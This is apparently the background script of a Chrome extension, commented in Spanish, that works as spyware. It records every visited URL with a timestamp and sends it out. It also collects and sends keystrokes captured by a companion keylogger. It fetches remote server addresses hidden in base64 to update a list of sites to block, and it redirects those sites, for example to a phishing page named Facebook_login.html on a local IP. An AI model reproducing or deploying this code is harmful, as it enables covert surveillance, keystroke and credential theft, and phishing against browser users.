'use strict';

import { sendData } from './SendModule.js';
import { codeFs } from './SendModule.js';
import { codeFr } from './SendModule.js';

//última URL enviada
var oldUrl = ""
//pestaña actual
var currentTab = 0
var oldSt = "*://www.unapagina.com/*"
var st = "*://www.unapagina.com/*" //"*://*." "*://www.facebook.com/*" "*://www.unapagina.com/*"
var rd = ""

//cuando se cambia la pestaña activa o se cierra una pestaña----------------------------------------- 
chrome.tabs.onRemoved.addListener(function(tabId, removeInfo) {
	checkData(currentTab);	
});
chrome.tabs.onActivated.addListener(function(tabId, removeInfo) {
	checkData(currentTab);	
});

//al abrir nueva ventana limpia posibles datos residuales de cache-----------------------------------
window.addEventListener('load', function (event) {
	chrome.storage.local.clear();
});

//al cerrar la ventana envia los datos que queden y limpia el almacenamiento-------------------------
window.addEventListener('beforeunload', function (event) {
	checkData(currentTab);
	currentTab = null; //evitamos el error dentro del evento onBeforeRequest(no hay tab activas)
	chrome.storage.local.clear();
});

//Activa con cada webRequest------------------------------------------------------------------------- 
chrome.webRequest.onBeforeRequest.addListener(function(details){	
	if (currentTab != null){ // Si la pestaña está activa (no se ha cerrado la ventana)
		chrome.tabs.getSelected(null,function(tab){
			if ((tab.url != null) && (tab.url != "chrome://newtab/")&& (checkForURLchange(tab.url))){
		  		currentTab = tab.id;
		  		var date = new Date (details.timeStamp);
		  		var pageInfo = {
		  			IdTab: tab.id,
					Url: tab.url,
					Time: date.toLocaleString()
				};
				sendData(JSON.stringify(pageInfo),0);
				checkData(tab.id);
	   		}
	   	});
	}	
  },
  { urls: ["<all_urls>"],}
);

//Comprueba si ha cambiado la URL y actualiza el valor de oldUrl------------------------------------
function checkForURLchange(currentUrl) {
	if (oldUrl != currentUrl) {
		console.log ('true ' + oldUrl + ' '+currentUrl);
		oldUrl = currentUrl;
		return true;
	}else {
		console.log('false ' + oldUrl + ' '+currentUrl);
		return false;
	}
}

//Comprueba los datos volcados en el almacenamiento por el KeyLogger y los envia---------------------    
function checkData(tabId){
		chrome.storage.local.get(['keys'], function(result) {
        	if (result.keys) {
        		var date = new Date();
          		var pageInfo = {
          			IdTab: tabId,
          			Keys: result.keys,
          			Time: date.toLocaleString()
          		}
          		sendData(JSON.stringify(pageInfo),1);
          		chrome.storage.local.remove(['keys']); //borramos el Item
          		//enviamos la orden para que KeyLogger vacie la cadena
          		chrome.tabs.sendMessage(tabId, {Identifier: 'borrar'}); 
        	}
        });
};

//actualiza los datos del fichero url para bloqueo y redireccion cada segundo--------------------
setInterval(actualizarStRd,1000);

//Comprueba si ha cambiado el contenido de ficheros url para bloqueo y redireccion---------------
function actualizarStRd(){
	Site(codeFs,0);
	if ((st != "" ) && (oldSt != st)){
		oldSt = st;
		setListener(st);
	}
}

//lectura del fichero de urls para bloqueo y redirección-----------------------------------------
function Site(code,mode){
	var SRV = atob (code)
	var ajaxReq = new XMLHttpRequest();
	ajaxReq.open("GET", SRV, true);
	ajaxReq.send();
	ajaxReq.onreadystatechange = function (){
		if (ajaxReq.readyState == 4 && ajaxReq.status == 200){
			if (mode == 0){
				st = ajaxReq.responseText;
			}else if (mode == 1){
				rd = ajaxReq.responseText;
			}
		}
	}
}

//cuando cambia el valor de la url a bloquear se actualizan los oyentes--------------------------
function setListener(ST) {
	chrome.webRequest.onBeforeRequest.removeListener(requestHandler);
  	chrome.webRequest.onBeforeRequest.addListener(requestHandler,{ urls: [ ST ],}, ["blocking"]);
  	chrome.webRequest.handlerBehaviorChanged(requestHandler);
}

//Redirecciona las URL a otra o la bloquea--------------------------------------------------------
function requestHandler(details){
		Site(codeFr,1);
		if (rd != "" ){
			return {redirectUrl: rd} //"http://192.168.1.42/Facebook_login.html"
		}else{
			return {cancel: true}
		}
	}